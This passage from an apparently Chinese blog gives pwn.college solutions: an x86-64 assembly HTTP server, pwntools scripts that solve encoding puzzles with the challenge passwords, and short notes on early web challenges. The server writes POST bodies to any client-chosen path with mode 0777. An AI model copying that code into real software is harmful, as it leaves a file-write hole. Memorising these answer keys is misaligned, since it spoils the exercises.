class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><span class="hljs-symbol">loop_accept:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # fork()<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">jne</span> parent_process<br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">je</span> child_process<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">512</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r15</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [buffer]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27;P&#x27;</span><br>    <span class="hljs-keyword">je</span> post_request<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27;G&#x27;</span><br>    <span class="hljs-keyword">je</span> get_request<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_request:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">4</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path_get<br><span class="hljs-symbol">loop_start_get:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">je</span> get_file_path_get<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start_get<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path_get:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path_get # open<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>              # read<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span>    <br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">post_request:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">5</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start_post:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">je</span> get_file_path_post<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start_post<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path_post:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path  # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="hljs-number">0777</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0x1FF</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r12</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, content<br><span class="hljs-symbol">loop2_start_post:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r12</span><br>    <span class="hljs-keyword">jge</span> get_content<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-keyword">je</span> get_index <br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop2_start_post<br><span class="hljs-symbol">get_index:</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop2_start_post<br><span class="hljs-symbol">get_content:</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">r15</span>, <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # write(<span class="hljs-number">3</span>, content, content_length)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r15</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">parent_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">jmp</span> loop_accept<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">512</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><span class="hljs-symbol">file_path_get:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span><br><span class="hljs-symbol">content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">reverse_content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><br></code></pre></td></tr></table></figure><h2 id="Playing-With-Programs"><a href="#Playing-With-Programs" class="headerlink" title="Playing With Programs"></a>Playing With Programs</h2><h3 id="Dealing-with-Data"><a href="#Dealing-with-Data" class="headerlink" title="Dealing with Data"></a>Dealing with Data</h3><h4 id="10-Encoding-Practice"><a href="#10-Encoding-Practice" class="headerlink" title="10. Encoding Practice"></a>10. Encoding Practice</h4><p>pwntools 的API说明：<a href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">Pwntools Cheatsheet</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">s</span>):<br>    s = u64(s, endianness=<span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(s)<br>    binary = <span class="hljs-built_in">bin</span>(s).replace(<span class="hljs-string">&#x27;0b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> binary<br><br>p = process(<span class="hljs-string">&quot;/challenge/runme&quot;</span>)<br><br>correct_password = <span class="hljs-string">b&quot;\x96\x92\xa9\xd6\xec\x83\xe3\xba&quot;</span><br>correct_password = encode(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="11-Hex-encoding-Practice"><a href="#11-Hex-encoding-Practice" class="headerlink" title="11. Hex-encoding Practice"></a>11. Hex-encoding Practice</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;hveetgwy&quot;</span><br>correct_password = enhex(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br></code></pre></td></tr></table></figure><h4 id="12-Nested-Encoding"><a href="#12-Nested-Encoding" class="headerlink" title="12. Nested Encoding"></a>12. Nested Encoding</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>correct_password = <span class="hljs-string">b&quot;arumrhnj&quot;</span><br>correct_password = enhex(correct_password)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>)<br>correct_password = enhex(correct_password)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>)<br>correct_password = enhex(correct_password)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>)<br>correct_password = enhex(correct_password)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>)<br><span class="hljs-built_in">print</span>(correct_password)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="13-Hex-encoding-UTF-8"><a href="#13-Hex-encoding-UTF-8" class="headerlink" title="13. Hex-encoding UTF-8"></a>13. Hex-encoding UTF-8</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>correct_password = <span class="hljs-string">&quot;📐 🌍 🍗 🔵&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>correct_password = enhex(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="14-UTF-Mixups"><a href="#14-UTF-Mixups" class="headerlink" title="14. UTF Mixups"></a>14. UTF Mixups</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;amoozuff&quot;</span><br>correct_password = correct_password.decode(<span class="hljs-string">&quot;latin1&quot;</span>)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;utf-16&quot;</span>)<br><span class="hljs-built_in">print</span>(correct_password)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;okeu&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(correct_password)<br></code></pre></td></tr></table></figure><h4 id="15-Modifying-Encoded-Data"><a href="#15-Modifying-Encoded-Data" class="headerlink" title="15. Modifying Encoded Data"></a>15. Modifying Encoded Data</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;\xf1~\xe6P\xc0\x9a\x1f\xa6&quot;</span><br>correct_password = enhex(correct_password)<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(correct_password)<br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="16-Decoding-Base64"><a href="#16-Decoding-Base64" class="headerlink" title="16. Decoding Base64"></a>16. Decoding Base64</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;iAb/uzx0uJQ=&quot;</span><br>correct_password = b64d(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br><br></code></pre></td></tr></table></figure><h4 id="17-Encoding-Base64"><a href="#17-Encoding-Base64" class="headerlink" title="17. Encoding Base64"></a>17. Encoding Base64</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;\\\x0fz\xf4\xe27\xe4\xf3&quot;</span><br>correct_password = b64e(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="18-Dealing-with-Obfuscation"><a href="#18-Dealing-with-Obfuscation" class="headerlink" title="18. Dealing with Obfuscation"></a>18. Dealing with Obfuscation</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;\x9c\xebn\xb4\xd1\xe5r\x05&quot;</span><br>correct_password = correct_password.<span class="hljs-built_in">hex</span>().encode(<span class="hljs-string">&quot;l1&quot;</span>)<br>correct_password = base64.b64encode(correct_password)<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br>correct_password = correct_password.<span class="hljs-built_in">hex</span>().encode(<span class="hljs-string">&quot;l1&quot;</span>)<br><span class="hljs-built_in">print</span>(correct_password)<br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="19-Dealing-with-Obfuscation-2"><a href="#19-Dealing-with-Obfuscation-2" class="headerlink" title="19. Dealing with Obfuscation 2"></a>19. Dealing with Obfuscation 2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_to_bits</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">format</span>(c, <span class="hljs-string">&quot;08b&quot;</span>).encode(<span class="hljs-string">&quot;latin1&quot;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s)<br><br>correct_password = <span class="hljs-string">b&quot;V\x04\x93\x98\x05\xd4^\r&quot;</span><br>correct_password = encode_to_bits(correct_password)<br>correct_password = base64.b64encode(correct_password)<br>correct_password = b64e(correct_password)<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(correct_password)<br><br>correct_password = b64e(correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>))<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br>correct_password = b64e(correct_password.encode(<span class="hljs-string">&#x27;l1&#x27;</span>))<br><br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h3 id="Talking-Web"><a href="#Talking-Web" class="headerlink" title="Talking Web"></a>Talking Web</h3><h4 id="1-Your-First-HTTP-Request"><a href="#1-Your-First-HTTP-Request" class="headerlink" title="1. Your First HTTP Request"></a>1. Your First HTTP Request</h4><p>用GUI打开，然后命令行运行<code>/challenge/server</code>，最后浏览器打开网页，即可获得flag</p><h4 id="2-Reading-Flask"><a href="#2-Reading-Flask" class="headerlink" title="2. Reading Flask"></a>2. Reading Flask</h4><p>访问<code>http://challenge.localhost/access</code></p><h4 id="3-Commented-Data"><a href="#3-Commented-Data" class="headerlink" title="3. Commented Data"></a>3. Commented Data</h4><p>查看源码，发现在注释中存在flag。随后，F12查看页面源码就行了。</p><h4 id="4-HTTP-MetaData"><a href="#4-HTTP-MetaData" class="headerlink" title="4. HTTP MetaData"></a>4. HTTP 